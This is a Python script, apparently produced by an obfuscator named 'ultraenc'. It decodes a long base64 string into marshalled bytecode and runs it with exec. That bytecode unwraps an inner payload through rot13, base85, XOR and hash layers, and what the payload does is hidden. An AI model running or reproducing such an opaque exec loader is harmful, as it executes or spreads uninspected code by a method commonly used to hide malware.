#!/usr/bin/env python3
# ultraenc final wrapper â€” keeps internals hidden
import base64, marshal

DATA = """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DAEIAXIDAAAAYQggAABuS1dQV3ljNnJhYnVWR2ptV1BSYU0wMXVWRjA4WElidVZGRUNaUlJnV1JnVkNKOXRYUUlPWUZFWUZHMWluRjQyREYwZ0hIZ1JXUGNsRVBSOEMxdGtERjAySTA1UldRMGNGUFI4QzF0a0RGMHhGMDQ5cFJTWkNtMWpGeVdPREYxRktUSDlwU0FMR0hSZ0p5cUJGMEgxQXk5T1lKa3dIeGdTWVFPc0RGNGNvMU1ZRUZqakxSUmhDUE1uRjBIZlpUU09GSXBpS1JBUERINWdESHlDWkpmdUNROUxad2duRndNTW4yajZLVE51WEcxbUVUcGFaeUxqRFFqZm56ZmhaUXRnWUhPbEZRUnlFSlZpTVB0aUZGeDNJRmY4SXpFWlhta0pNUmplQ1NNeEdQZjhJekVaWG1rSk1SamVDU014R1BmOEl6RVpYbWtKTVJqZUNTTXhHUGY4SXpFWlhta0pNUmplQ1NNeEdQZjhJekVaWG1rSk1SamVDU014R1BmOEl6RVpYbWtKTVJqZUNTTXhHUGY4SXpFWlhta0pNUmplQ1NNeEdQZjhJekVaWG1rSk1SamVDU014R1BmOEl6RVpYbWtKTVJqZUNTTXhHUGY4SXpFWlhta0pNUmplQnd4M0d5U09Wd3F0RjB1QUR5ZmVDU014R1BmOEl6RVpYbWtKTVJqZUNTTXhHUGY4SXpFWlhta0pNUmplQ1NNeEdQZjhJekVaWG1rSk1SamVDU014R1BmOEl6RVpYbWtKTXpFRURGVjNMUmdxQlFnQm5KcGZBdzhlQ1NNeEdQZjhJekVaWG1rSk1SamVDU014R1BmOEl6RVpYbWtKTVJqZUNTTXhHUGY4SXpFWlhta0pNUmplQ1NNeEdQZjhJekVaWG1rSk1SamVDU014R1BmOEl6RVpYbWtKTVJqZUNTTHZBenlhWVJFb0hIUi9KRmZlQ1NNeEdQZjhJekVaWG1rSk1SamVDU014R1BmOEl6RVpYbWtKTVJqZUNTTXhHUGY4SXpFWlhta0pNUmplQ1NNeEdQZjhJekVaWG1rcUptT1lLR3Q3SHp5YVlQa0dISE9GcVNrWEVVSWZFenlhWVJXUVhta0pNUmplQ1NNeEdQZjhJekVaWG1rSk1SamVDU014R1BmOEl6RVpYbWtKTVJqZUNTTXhHUGY4SXpFWlhta0pNUmplQ1NNeEdQZjhJekVaWG1rSk1SamVDU014R1BmOEl6RVpYbWI1QTA1RURITUNNUmt0TVRNc1hta0pNUmplSEhTcUIyeWFZUkVvSEhSL0pGZ2NNbGtSSjFTT0V4OXhHVE94TXk5Y01sa1JKMVNPRXg5eEYxMDRCMVdjTWxrUkoxU09FeDl4R1RPeE15OWNNbGo0STFTT0V4OXhHVUlDSzFNY01sa1JKMVNPRXg5eEYwdUFEeWZlQ1NNeEdQZjhJekVaWDFTT0tIQWNNbGtSSjFTTnBSUmFYbWtKTVJqZUNTMW9aUmdxQlFnRm5KcGZFU2dFREhNQ01SazFHMTlKbkpwZkF3OGVDUzFvWlJncUJRZ0ZuSnBmRVNnRURITUNNUmsxRzE5Sm5KcGZBdzhlSEhTcUQyeWFZUkVvSEhSdkEyT1pxSDlzSXp5YVlSRW9ISFNURzJFWUZSMVJwMVNPRXg5eEdVSUNLMVdjTWxrUkoxU09FeDl4R1VJQ0sxTWNNbGoyQ2xmOEtJZmpGMTA0QjFXY01sa1JKMVNPRXg5eEdVSUNLMVZlQ1NNeEdUeWFZUkVvSEhTVEcyRVlLR3Q3SHp5YVlSRW9ISFNURzJFWkxURHhGSnlhWVJFb0hIUi9KRmZlQ1NNeEdQZjhJek14SEhTVEcyRVpxSDlzSHZnRURJMVFuSnBmRHhaZUNTTXpNU1NPRXg5eEdVSUNLMDRlQ1NNeEdQZjhJek14SEhPWlhtZ0VERlYzTFJncUJRZ0JuSnBmRVNnRURHOU1YbGY4SXpFWlhta0pNUmplQ1NNek1TU05IYUVwR1VJQ0sxTWNNbGtSSjFTT0V4OXhGMHVBRHlnY01sa1JKMVNPRXg5eEZ3TjFwMXBlSEhTcUJsZjhJek14SEhPWlhtZ0VERlYzTFJncUJRZ0JuSnBmRVNnRURHOU1YMnlhWVJFb0hIU1RHMkVYWlFJbUkyeWFZUkVvSEhSL0pGZ2NNbGtSSjFTT0V4OXhGd04xcDFxY01sa1JKMVNPQzF4ZW5KcGZFU2dFREhNQ01SZ3FCUWdCbkpwZkJTcUVERlYzTFJrMUcxOUpYbWtKTXpFRURITUNNUmsxRzE5Qlhta0pNUmplQnd4M0d5U09FeDl4R1RPeE15OGVDU014R1BmOEl6TXhISFNURzJFWnFIOXNJenlhWVJFb0hIT1pYRlplQ1Mxb1pSazFHMTlKWG1rSk1SamVDU016TVNTT1Z3cXRHVUlDSzFNY01samZIMVNOSGFFcEZ4RTFvUjVjTWxrUERsZjhJekVaWG1rSk1SamVDU014R1BmOEl6RVpuSnBmWVNBRURITUNNUmt0TVR4dkhIU1RHMkVaTFRFektsZjhJekVaWDFTT0tHOWNNbGtSSjFTT0V4OXhGeEUxb1JNY01samZIMVNPRXg5eEdUT3huRldFREhNQ01Sa3RNVE1zWDFTT0tIQWNNbGtQRGxnRURJMVFuSnBmRHhaZUNTTXpNU1NPRXg5eEdUT3huRldFREhNQ01SazFHMTlCbkpwZllTQUVEU1cwS1JjUnFKa1RuSnBmWHdmZUNTMW9aUmsxRzE5Slhta0pNUmplQ1NMdkF6eWFZUkVvSEhTVEcyRVlLR3Q3R3p5YVlRdUtISFJ2QTJPWUtHdDdHdmY4SXpFWlgxU09LSEFjTWxrUkoxU09DMXhlWG1rSk16RUVESE1DTVJrdE1UTXNYbWtKTVJrY01sa1JKMVNPRXg5eEYxMDRCMDVjTWxqNEkxU09FeDl4R1VJQ0sxTGVDU014R1BmOEl6RVpYbWtKTVJrY01sa1JKMVNPVndxdEYxMDRCMDVjTWxqNEkxU09Wd3F0R1VJQ0swNGVDUzFvWlJjUnFKa0JuSnBmRVNnRURGVjNMUmdxQlFnQm5KcGZCU3FFREc5TVgyeWFZUkVvSEhTVEcyRVlLR3Q3R3p5YVlRdUtISFNURzJFWnFIOXNJdmY4S0lmakdVSUNLMUxlQ1NNeEdUeWFZUkVvSEhSL0pGZ2NNbGtSSjFTT0MxeGVYbWtxSm1PWnFIOXNJdmY4S0lmakZ4RTFvUjVjTWxrUkoxU09Wd3F0RjEwNEIwNWNNbGo0STFTT0MxeGVYMVNPS0hBY01sa1BEbGY4SXpFWlhtYjVBMDVFRFNXMEtSY1JxSmtUbkpwZllTQUVEU1cwS1JjUnFKa1RuSnBmWHdmZUNTTXhHVHlhWVJFb0hIUi9KRmZlQ1NNeEdUeWFZUGtHSEhPWlhGWmVDU014R1BmOEtJZmpGeEUxb1JNY01samZIMVNOR1BmN0hIT0ZxU2tYWlFJbUlsZjhJekVaWG1rSk1SamVDUzFvWlJjUnFKa1RuSnBmWVNBRURTVzBLUmJqQUtBS1hta0pNekVFRFNXMEtSY1JxSmtUbkpwZllTQUVEUmpjVmxmOEtJZmpGeEUxb1JNY01samZIMVNOR1BmN0hIT0ZxU2tYWlFJMW8xU05IYUVwRndOMXAxcGVISFNxQjJ5YVlQYjdYMVNPS0dnY01samRCbGY4SXpNeEhIT0ZxU2tYWlFJbUlsZ0VESTA3bkpwZllTQUVEU1cwS1JjUnFKa1RYbWtKTVJrY01samZIMVNOR1B4d1hta0pNUmp4QXlJVkF2ZjhJekVaWG1rSk1SamVISFNxRDJ5YVlSRW9ISFIvSkZmZUNTTXhHUGY4SXpFWlhta0pNUUxlQ1NNeEdQZjhJekVaWG1rSk1SamVDU014R1BmOEl6RVpYbWtKTVJqZUNTTXhHUGY4SXpFWlhta0pNUmplQ1NNeEdQZjhJekVaWG1rSk1SamVDU014R1BmOEl6RVpYbWtKTVJqZUNTTXhHUGY4SXpFWlhta0pNUmplQ1NNeEdQZjhJekVaWG1rSk1SamVDU014R1BmOEl6RVpYbWtKTVJqZUNTTXhHUGY4SXpFWldSdHpMMWdRRUlWNVlJMUZWdjRkWDBBcVd2YmVFSDB5V1JFWG52RGVYbWtKTVJqZUNTTXhHUGY4SXpFWlhta0pNUmplQ1NNeEdQZjhJekVaWG1rSk1SamVDU014R1BmOEl6RVpYbWtKTVJqZUNTTXhHUGY4SXpFWlhta0pNUmplQ1NNeEdQZjhJekVaWG1rSk1SamVDU014R1BmOEl6RVpYbWtKTVJqZUNTTXhHUGY4SXpFWlhta0pNUmplQ1NNeEdQZjhJekVaWG1rSk1SamVDU014R1BmOEl6RVpYbWtKTVJqZUNTTXhHUEQ5TEZqN3JhYnVWRlI1WEZSdVZHOGVWRlJhb3didVZGSGJXUFI4Q1BmMFZGZ25ZUHh1Rkl4d3BJeGFLd2I5VkZjMUQwZnZYbVJnQ0ZSaEFUMDhWR1N1Wkc0dkV4amxMRlJoQVQ5b1ZKVjdEMjB1S0dPZ0ZsUmVKdnR3VkdTV0gwanZMSnFZRlBTQUYwZ3ZWRmduWFBadVl3NHpLdldUR1JJVlZKdXpJR2Z1RlI4dUVQV3NvdjFBVnpOdlpTZ1puSk93REZXc0EycXZWeHl6RDE0dUx3Z0NNbFN5SUhrR1ZGYjVZbVZ1VkhINVhGUmhxUlNUVkZnblhQWnVWRmJhVmxSZEJGOGxWMWNRS2x4dVgxYmFBUFJ1RUdjR1Z2SXRGbHB1WFNmYm52UmdXeGZhVkZ1eFpQRHVYU2ZkWnlweUtRV0RWRlJkV2xadVh4ZjZXdlJnV3hnQVZGa3dHeVp1WUhTU0psQVFBRjhmVkZSZFdsWnVZSFIvTGxXc0EzT3lWSGtkWFNmdUx3Z0xudlN5SUhrR1ZGY1lCbTQybnZjWlpsQXRvbHQwWG14N0ZKYndBdzFhR3Y1S0x6TDRWeTg0VkpwdUdUYmJWdkh1WnpMYVYwRG1XeHR1WkpSM1dsSCtYMTgzVkdrU1pGSHVYeGY3QVBSaEN2YnhWMFNtb1NidVl3NGRXUFo3Q2wwbVZGMU9DMlp2S210ZG52U1pudnVvVkpWN00yOHVNSUlaSGxSZUp5dCtWRklPR1NEaFpUZmlZUDFFb1FXc1htNVZWbUxlQ3Zaam5sTVpIMWt5QnY0Z0FQcDVHU01QRlAxaVZGNWhZMDBsQlRSZ0hKa1JMR3VETFB4YkIyU2RESGYySW00a1dta1JBdnRpWTAwbEJTYmdISmpsS2xmOUQxQVRBU3VMSkpaZUN2WmpubEVGWUkxYkIwV0ZLU3BqTVBMelZ4dDBadjlBWDBTTW9TdGpNbDQyQXY5QVp3dXpZSVNmRVRSNEhUTmNYUUkwbmFXakIyU2RESGYySW00aktsOGxESlYwWG00d1p3TnhabVJ6WGw0akJQMGdFeEQxSVBxUk1hTmpJRldzRVM1akVUTU1Yek51VkZSdkRGeHdwMXQ2Q3djS3FGSDdMbDAwWndMZkgweVpMUVNQRzBaMkNQMXFKd2JoWWx5UVgxT1dWR0FTTHY5YVZ3amdCVGtIVkZSeEFSdCtwUGI4SnhEaFl3amNEUkh2bjFxblZsNVRMR0FucElEa0ZQV1FNdjVSTWwwOURGUnVWRlZhWDE1VloyYjdFbXVWRjBTWUpJeWpFeFovQm1TUW52U3JuUk1TRjFNeUZRQXdXeEg0QW05SUZtQW9WRmtNRUpWaU1QdGRwemo1RFE0Nm52amFCMlpnQVFXTkVUTHZLSWJmRUd5RUpKOWdHVUlRbktBS1hSRGhZS0VoSktXTFYxMHZEMmtyTDBFVEhGTXJNbE1lcUZTVEhRTWVDeFNJV3cxQlZ6TmlYbEVPSVJ1WVkwTGRYVHgwRXpPbkFtOVNZVDluWkhNU1l4dXRWRlJiS3l1TkNRTXJaME9rTXpqNFdVV2FwSXVPSVB5ckFHcDhaMEl5RUo1SU0ycVVKMmY4WFJNUkFJYmxNbE1mRVFrU0oxODZGdkFQRzB1MEV2dWlIR1NhV3prWENSQWFXRmN0RFFrZkpsMU5CeXVWQUZBUEFQY21EMng4TFQwOXBTRDBLSExkWFRabUVKV2hveldTTHdOOFp4RXpaU3BnRUl1SnBSYnVCUXFWTHlwN3BVV0lWRlJ1VjNSeEJJcVZGSE1TWkpMeEVSeU1vVFJjWXlWK24wT2xWME1nRUhxR3FLV1JGeEl0b0hNUkFJYmxDMXVwVmxFUkZJdVFLRlJ1V0ZxcXJ2UjlZM0gxVkcwaUtHcHVDemdiRkZSK0pJa0FWSERtREZMdUN6Z2JGbFNPbnpNZVZIdVlYU3h1VkZFWlphYzZWRlJ1VkZMdVZGUnVYdlJ1VkZXQ1ZGUnVWdzlwWVNjWlkwTDVXUkF0REYweFowV1lYdkVuWGxSOEMxdDBERjFOSFRBVEJHTWFuSHVjSjJTcURGMUdWYVIybkk5Y0MweGpBVGJ1RXZEZUcwSVRCRmtoSTBSZ01USWJGbHllcUlTT1lUOUNZeEw1V1JBdERGMWdDeWdWbko4dVdJV3pGVURlSDB1U0RsdVlYdkVuWGxSOERRQVNJUklKVnp0a0tJSGNGSFJmb2w0d0h5UmdZRnVaRHZ1aU1IUmhYSjlCRjBJMXB2MDJuSTljQzB4akNJcWxEbHFIWDJ1QkltZ0tHeFJmb2w0d1ZHai9aRkVPWVRrdEFQVjVDRk1KQlJ0OEJGRDRZVVdNbnhJQ0EwcHdCUnQ4QkZENFlGU3Nad09TQmxnRlZHajhZRlo5SVJTV1d4UmZvMDhoWXdTT3AyOGlMMXllR2xEOHBQdW1BMUF4Qm1EM3B4NDhKSEFiQVRSZktJVnZZd09Qb1FxVm9GZ1FJUWZ1RVA0ZUhHRU5CM1ppbkhBbEVJRGJFVE1GRlM4aU1UQUpYbFJ1VkZWaVZHajhYdlc2cnZTS0ltWndWS1dsQ1BEN0p4dXhxUkkwREdrQ1ZGZzFCeWJ1WHo5ZUpGU1dHM05rVkpBcEMwUnVZRjloSXZSdVdGRUpWRlJ1VkhidW96MXFZd09FRkowaFZGUnlXU0x1VkZSdkN2dXFKUjg1RUlidm5JcHVCUXF3RHhBYkozWjBEVVdWQVBwMHFGUnhCbFI2cFFPZFZGUnlDVHlUWFJjeFYwT2tLR0VMRVJ5eFhhU05wVVozWUdFUktVU1VEUWdaVkhmaW52Y2xMSExkWFQ4a0VQOXNLVDB1THh0MnFGU3VBS0VaRXk5MEZsZ09JUjR1WkhNU0NsNDlEMnFiWjI5VEp5RUZXbFJkS3lJRFgwT2pBVFNKS0k0eXBSTVFMMVpiRXk5Zlp3a05CMUVUTFRObUQzTjdCSWJlR0pXT293NWRXeE9JSm1NWEQwa1hDYU9Qb1N4K1lSRXpJU0w1REdxcUpUeVZWenRoRjBJTEIxNVVWRjR2b3l0K0NKdUZKd2NaWVB5d1lKeXVBSHhlRUgwM0NIU1lKSHRjRDJ5bUlsZ1RKR0V5QkhOOFlURWhEUWtmQkZ1TklJZjJGeEFhblFIdkp2RVFCUDRpblNBdUxST3pKeVJqcmFidVZHWmdWbFJ1R3c4elZGWndDd0R1WUd1aElGUnVXU3RtRlR5RkV5NVdaUFdTbkhrcUVUTGFGbGJ5WW1jU0NSZmxDMElNb3pBSlZGSU5wSnRjQ215dUJsNGpDSDRpVkZSdVZ2THZFSVo2VkhTbkFJMUJXMElPWG1JU0pKNXdJdlJnWTNTS1ZGUnlXU2J1VkZSdUpsUnVWRlYrWHdqMldtNGhaVUFsWEZSdVZGVitWS1dsQ1BFU0kxUjBEUFI0QTA1ZURJRHhabGtOQm1PTG94TVNFUmJkV0dwOXB4cU9IM0lITTBTSEdLTmZFVExqSGxqdVZGUnZXdlp5cEhPeER4OTFabUh2bjJiY25IRXpJU3VXV1BBQ1hhUi9KeUVrVzBTSEhJUmlFRmtpb1JTVlZHU09vSFdmb0tOZ0NLTjVWeU1UWEZrY0JsdXFKUjg1RUljdkN5NHVZRjlrSWxSdVhTNXRFdnVYTVBBTnBJMDBKUkVXTVBja0RVT21BbDR1VkZSdkNsTXdLMjRtVkZSZEhHUmJLSmNhRFBJWUhJajJYRzlaR3lOekwyMHdWdlJ1VkZWaXJhYzZWSXFLWmxad0hIOWNYR01CRFB5eEV2dUREMU51WUhSbUtsU1RxR0VPVkpJSUhGanVGSXVsb2wwL0ZtamxWRjFPQXlOdlhTTVdMbFN5SUg0ZVZIeUxxS1Z1RWFIOUZsU1ZGMkwzVnZnYUhTRHVZRnhlRHZSZ1d4Y0NWRjFPQ1RwN3FKazBWdlJ1WHZ1T1Z4SUxKeUR2S21xYW5GU3lJSGtHVkZjWUIwUnlIU1dnV3ZJTEtRcTFWelNhQ3kwd0VRWmJuRlN0Rmx1WFYxeWlKMTR4Q1BxeXBGZ1FvMERsRDBMOUEwV1RMSFJqSEhWMVhIWndFUkg0b3hEdkQyWmtuSFNIS0g4YlZGUndKdkFzb1BXSnFIV2ZvSjhpRXhBUFphSVJZdjRtV3hXZk1IVmdFSkFNcHdFUG9IMTFNUDExRUhaN1htNVVIRkxqRnhwa1pRQW5weHFSVkZSdVZ4UmRDUUxhQ3c0NUh3dWpBM1NZSVF5T0lSRUlXUGdRS0ZMZFgwSVpxUWN0WjBBVHFSV2ZKM05kWDJPb24ydHVWRkVyRUYxQkV2a2tWbVZqQUtPUkZscXRDMElLSndjT1ZHdDNHenVSRjA5R0N3a3VNek15REg5SUkxZ1JNeUVlWWxSdVZGQUVWdnlKTEp4aFpRMUJBbFJ1VkZWK1lTU1dNeElTSko1d0l2UmdZMjVKVkZSeVdTcHVWRlJ3SEZJa014dWtDMWNhRXZFU0xINUJxSEhnQXd1UkFUOXZISTlTcVNBVkhGUnVWRkRqVklxY0R3dHVDRjlxWWxSOVkxMDNWRzVNS0lMaE15MURHUk96SEhmaXJhYzZWRlNTQkZIdVhQMXNNUFJnQkdxc1ZGUnlYeE9UQkZraEhIUmdZeFN2Rmx5ZXFJU1RCR01DTHhSZ0F3OVRGbGJ4SnZnSEVIQWVNd2duRndNQUJ3QU9Ndkh1VkZSL0ZsZjhJekhsWlRjRG9sWjdYM1ZkVjBFeklTTU5FeXF2RG1xT0YxYnpZeE1RTDFaYUVKU3RNejVUWnl4OVgwdHVxU3h1WG1rSk1SaitCMFdYWVM5Ykp3UjREMXBkRjNBSFh6QXBMUGY4SklqbVZGUnVWeFJjQ215dUJtZ3lDVGdTRHpqaEh2SVBvSDlYQkh0dXFTZmtKdlprSm1Eak1JeDZad0FucElEbEVQNGhXMnFSRjBmN0JGV1NFbFdFVkZSeVdSUnVWRlJ2Q3YxQkV2a1ZNbHBjSFE1U0x5RVlBRnVxSlI4NUVJeWhMMUx1WUY5aEl2UnVXRkVLVkZSdVYxUnhXUU93cUhxTllRVzFFUmdHSDFOdVZGSGFFM2J1Q1VXS1lLVjhDUkFUWTB0K0x4NU5NeVNZWTNjNlZGUjhabER1Vkg0L1d2UmJZSTl4VkYwN3B5THVWRkhkRFJMNVlIeXZERjB5QjJTWVhKZzFISEw1RFAxa0ZGOWhJM09PWUYxQkZ4SXFERjVSRmx5ellJdVdaUFd0cVJMNUhta09Fd3l4WlQ5Vm5KSWpXSUV0RWw5aUVHMUZDM1dPWUdNSEYwSXRNUkV0RXd4Zm95RU9ZSHlHTUhmY24zSUVFd3loR3hxSExRNGNveEg5SHZxZEV3eGZveU1PWUZIN0xIZmNuM0lFRUcxRUdTYjdKeGIyR21ibVdTdU5WRlJiS3lWa1Z6a0xMUk1LR1Ixc1ZHSWRJUVNuVmFSNkswQWxFSURiRVRNRkZTOGlNbDhkQnh0dk1IWjJLMjQ1b1BxT0lSU2xBbEFFRzJ4Y0V5eG1KVDh1WHk1SUhQZ05NbFdwSXpIYW9KeVBvSGtoRDBTcVhSSW9FUHA2VjNTc293YmNXMFNHcHlNVFgwTGhEd2tPQW1NSEJGZ1JBSERpRHpqMUcxTnhDbTlMSWxSdVdGRU9WRlJ1VjFSeFZ3cWdMeFdlS2FPc0VKQXdDSVZ1VkZSdkN2NXpLSU9aRUl4elowNHVCUXFCcEhNdFhHRVZWRlJ1VjFSdlh3dXVZMnB6cVVIbUR6a2VNUGdhV21WelYwRXlJMTFnRUlmYkhUUnVZR045THZSdVdGRUpWRlJ1Vnc0YktJdUNCSEluVnp5S1ZHdDNISjFOQm1PSUpQUnVWRlYvV3pBc293WnVWRmNFWmxXalZhSGtXUVo2THc4d0hJeVJCRkRtRW1MZFZGUnVWMVJ3SjE1a0lITjdaU0l4QzFXblZ4NGhaSUlPWlBSdVZGVitYMjliSVJaOXBGWnlLeEV5RUprMEV2dVhNUEFOcEkxZkxGUnVWRlZ6V1BENUxGU1JZeE9aVjBFeklUZndWRlJ1Vnc0a1dhUjZIMElwRkh5aFZGMGlxU3R1VkZIeE1QUnVWRlYrWXpNcUhSa1NLUDQzbmxSZ1pVT21WRlJiS3l4L0pSeXBKeERoSHZxcUVJeWhMMUx1WUY5aEl2UnVXRkVKVkZSdVZ3NGNWM0FMQnpwYUR6TUxFVEhlVkZrT0d6cGVwUFJ1V0ZxS1ZGUnVWRnh1Q0Y5cUFsUjlIM0gzVktBUFd3MGNEUTkxS1BIa1ZHRVRXSGo4WFR0bVd3a0VId1p6R3hJVURVU1dLU3lOQndrR1ZIT0VXSThnREp1b0tQdU5CeDA4WW1BT25JY1paSGtjQVIwbUR2OTFJd1NBWkZrQlpKcW1udkxrWUZNZkhtV3RFSVNZWlI5d01UMG1FekFN2gVwbGFpbtoAKQFyJwAAACkWWgljeV9sb2FkZXJyAgAAAHIDAAAA2glFeGNlcHRpb25yDAAAAHIFAAAAchMAAAByNAAAAHIKAAAAchAAAAByEgAAAHIWAAAA2gNzdHJyIQAAAHIcAAAAciYAAABaB1BBWUxPQURaBE1PREVaCFNBTFRfSEVYWgdLRVlfRU5W2gRjb2Rl2gRleGVjcggAAAByCAAAAHIIAAAAcgkAAADaCDxtb2R1bGU+AwAAAHMiAAAAAgEUAQwBJgIIAwgDCAMIAxIDEgcYDA4IBAEEAQQBBAISAQ=="""

try:
    blob = base64.b64decode(DATA)
    code = marshal.loads(blob)
    exec(code)
except Exception as e:
    print("Hata:", e)
